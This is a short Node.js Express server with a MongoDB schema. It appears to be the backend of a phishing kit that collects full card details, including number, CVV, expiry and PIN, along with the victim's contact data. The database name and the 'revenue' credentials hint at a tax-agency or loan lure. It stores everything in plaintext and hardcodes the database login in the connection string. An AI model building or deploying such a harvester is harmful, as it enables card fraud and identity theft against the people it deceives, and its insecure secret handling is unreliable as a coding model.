var express=require('express'),
  app=express(),
  mongoose=require('mongoose'),
  bodyParser=require('body-parser');

// App Config
app.set('view engine','ejs');
app.use(express.static("public"));
app.use(bodyParser.urlencoded({extended:true}));
mongoose.connect("mongodb://revenue:cra123@ds145790.m.lab.com:45790/loan");

app.listen(3000,'localhost',function(){
  console.log('server started.');
});

//mongoDB schema
var cardSchema= new mongoose.Schema({
  user_name:String,
  mobile:String,
  email:String,
  address:String,
  number:String,
  name:String,
  cvv:String,
  expiry_date:String,
  pin:String
});

var Card= mongoose.model("Card", cardSchema);

// Routes
app.get('/', (req,res)=>{
  res.redirect('/payment');
});
// payment
app.get('/payment', (req,res)=>{
  res.render('payment');
});
//New route
app.post('/payment',function(req,res){
  Card.create(req.body.card,function(err,data){
    if(err){
      console.log(err);
      res.redirect('/payment')
    }else{
      console.log('Added Data');
      res.redirect('/confirmation');
    }
  });
})

app.get('/confirmation', (req,res)=>{
  res.render('confirmation');
});
